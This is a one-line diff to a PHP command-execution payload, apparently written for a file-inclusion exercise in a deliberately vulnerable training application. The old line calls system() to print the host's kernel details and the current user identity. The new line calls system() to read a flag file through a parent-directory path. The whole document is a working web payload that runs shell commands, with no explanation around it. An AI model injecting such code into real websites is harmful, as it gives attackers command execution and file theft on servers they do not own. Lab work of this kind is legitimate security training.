@@ -1,1 +1,1 @@
-<pre><?php system('uname -a; id'); ?></pre>
+<pre><?php system('cat ../../hackable/flags/fi.php'); ?></pre>
